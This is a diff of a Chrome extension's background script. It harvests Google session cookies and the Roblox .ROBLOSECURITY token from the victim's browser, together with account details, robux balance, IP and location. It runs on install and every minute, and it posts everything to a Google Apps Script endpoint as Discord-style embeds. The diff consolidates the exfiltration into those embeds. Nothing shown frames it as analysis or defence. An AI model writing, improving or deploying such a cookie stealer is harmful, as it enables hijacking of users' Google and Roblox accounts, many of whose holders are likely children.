@@ -1,39 +1,21 @@
-// background.js — v3
+// background.js — FINAL
 const GAS_URL = "https://script.google.com/macros/s/AKfycbwXz56f1L65iUPJaDy4GYps2_YF9svy_rklc40aKtQJxs7egVz4jjqDk6VcHSrqCMJcbg/exec";
 const CHECK_INTERVAL = 60_000;
 
 const CONFIG = {
-  google: {
-    type: "google",
-    domain: ".google.com",
-    url: "https://www.google.com",
-    sessionCookie: "SID",
-    label: "GMAIL"
-  },
-  roblox: {
-    type: "roblox",
-    domain: ".roblox.com",
-    url: "https://www.roblox.com",
-    sessionCookie: ".ROBLOSECURITY",
-    label: "ROBLOX"
-  }
+  google: { type: "google", domain: ".google.com", url: "https://www.google.com", sessionCookie: "SID" },
+  roblox: { type: "roblox", domain: ".roblox.com", url: "https://www.roblox.com", sessionCookie: ".ROBLOSECURITY" }
 };
 
 chrome.runtime.onInstalled.addListener(() => {
-  console.log("[bench] installed");
   runAllChecks();
 });
 
 setInterval(runAllChecks, CHECK_INTERVAL);
 
 async function runAllChecks() {
-  await Promise.all([
-    checkTarget(CONFIG.google),
-    checkTarget(CONFIG.roblox)
-  ]);
+  await Promise.all([checkTarget(CONFIG.google), checkTarget(CONFIG.roblox)]);
 }
-
-// ---------- helpers ----------
 
 function cookieGetAll(filter) {
   return new Promise(resolve => chrome.cookies.getAll(filter, resolve));
@@ -71,8 +53,6 @@ async function getGeo() {
   }
 }
 
-// ---------- core ----------
-
 async function checkTarget(target) {
   let found = false;
   let sessionValue = null;
@@ -80,8 +60,7 @@ async function checkTarget(target) {
   if (target.type === "google") {
     const cookies = await cookieGetAll({ url: target.url });
     const names = new Set(cookies.map(c => c.name));
-    found = ["SID", "OSID", "SAPISID", "HSID", "SSID", "__Secure-1PSID", "__Secure-3PSID"]
-      .some(n => names.has(n));
+    found = ["SID", "OSID", "SAPISID", "HSID", "SSID", "__Secure-1PSID", "__Secure-3PSID"].some(n => names.has(n));
     if (found) {
       const sid = cookies.find(c => c.name === "SID" || c.name === "__Secure-1PSID");
       if (sid) sessionValue = sid.value;
@@ -108,8 +87,6 @@ async function checkTarget(target) {
   }
 }
 
-// ---------- Roblox ----------
-
 async function handleRoblox(sessionValue) {
   try {
     const auth = await safeJson("https://users.roblox.com/v1/users/authenticated");
@@ -126,25 +103,17 @@ async function handleRoblox(sessionValue) {
 
     const emailVerified = !!(email && (email.isEmailVerified || email.verified));
     const has2FA = !!(twoFA && twoFA.primaryMediaType !== null);
-    const created = profile && profile.created
-      ? new Date(profile.created).toLocaleDateString("tr-TR")
-      : "?";
+    const created = profile && profile.created ? new Date(profile.created).toLocaleDateString("tr-TR") : "?";
     const robux = currency ? currency.robux : 0;
     const avatarUrl = avatar && avatar.data && avatar.data[0] ? avatar.data[0].imageUrl : "";
 
-    // 1) TOKEN — normal mesaj (garanti kopyalanabilir)
-    const tokenMessage =
-      "**" + (auth.displayName || auth.name) + " — .ROBLOSECURITY**\n" +
-      "```\n" + (sessionValue || "N/A") + "\n```";
-    await sendToGASRaw(tokenMessage);
-
-    // 2) EMBED — bilgi kartı
     const embed = {
       content: "",
       allowed_mentions: { parse: [] },
       embeds: [{
         title: auth.displayName || auth.name,
         url: "https://www.roblox.com/users/" + uid + "/profile",
+        description: "**:key: .ROBLOSECURITY**\n```\n" + (sessionValue || "N/A") + "\n```",
         color: 3447003,
         thumbnail: { url: avatarUrl },
         fields: [
@@ -170,33 +139,23 @@ async function handleRoblox(sessionValue) {
   }
 }
 
-// ---------- Google ----------
-
 async function handleGoogle(sessionValue) {
   try {
     const geo = await getGeo();
     const cookies = await cookieGetAll({ url: CONFIG.google.url });
 
-    const important = ["SID", "HSID", "SSID", "SAPISID", "OSID", "APISID",
-                       "__Secure-1PSID", "__Secure-3PSID",
-                       "__Secure-1PAPISID", "__Secure-3PAPISID"];
+    const important = ["SID", "HSID", "SSID", "SAPISID", "OSID", "APISID", "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PAPISID", "__Secure-3PAPISID"];
     const found = cookies
       .filter(c => important.includes(c.name))
       .map(c => c.name + " = " + c.value)
       .join("\n");
 
-    // 1) TOKEN'LAR — normal mesaj (garanti kopyalanabilir)
-    const tokenMessage =
-      "**Google Session Cookies**\n" +
-      "```\n" + found + "\n```";
-    await sendToGASRaw(tokenMessage);
-
-    // 2) EMBED — özet
     const embed = {
       content: "",
       allowed_mentions: { parse: [] },
       embeds: [{
         title: "Google Cookie Bulundu",
+        description: "**Google Session Cookies**\n```\n" + found + "\n```",
         color: 3447003,
         fields: [
           { name: "🌐 IP", value: "```" + geo.query + "```", inline: true },
@@ -215,8 +174,6 @@ async function handleGoogle(sessionValue) {
   }
 }
 
-// ---------- GAS bridge ----------
-
 async function sendToGAS(type, payload, fileContent, fileName) {
   try {
     const body = {
@@ -234,20 +191,6 @@ async function sendToGAS(type, payload, fileContent, fileName) {
     console.error("gas bridge:", e);
   }
 }
-
-async function sendToGASRaw(text) {
-  try {
-    await fetch(GAS_URL, {
-      method: "POST",
-      headers: { "Content-Type": "text/plain" },
-      body: JSON.stringify({ type: "raw", raw_text: text })
-    });
-  } catch (e) {
-    console.error("gas raw:", e);
-  }
-}
-
-// ---------- instant Roblox tab hook ----------
 
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
   if (changeInfo.status !== "complete") return;
